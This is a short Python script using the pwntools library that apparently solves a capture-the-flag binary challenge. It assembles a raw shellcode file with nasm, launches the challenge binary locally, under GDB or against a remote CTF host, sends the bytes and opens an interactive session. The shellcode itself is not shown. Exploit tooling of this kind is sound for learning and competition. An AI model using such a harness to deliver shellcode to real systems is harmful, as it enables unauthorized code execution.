#!/usr/bin/python3
import subprocess
from pwn import *

elf = context.binary = ELF('./chal')

# you can compile your raw binary with the command given below. Also use "wc -c solve" to get the size

# Define the command as a string
#command = "nasm -f elf32 solve.asm -o solve.o"
#command1 = "ld -m elf_i386 -s -o solve solve.o"
command = "nasm -f bin solve.asm -o solve"

try:
    # Run the command with shell=True and check=True
    subprocess.run(command, shell=True, check=True)
    #subprocess.run(command1, shell=True, check=True)
    print("Command executed successfully!")
except subprocess.CalledProcessError as e:
    print(f"Command failed with return code {e.returncode}")
    print(f"Error message: {e}")

gs = '''
b *0x555555555580
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("0.cloud.chals.io", 16612)
    else:
        return process(elf.path)

io = start()
data=open("./solve","rb").read()

print(data)

io.send(data)

io.interactive()
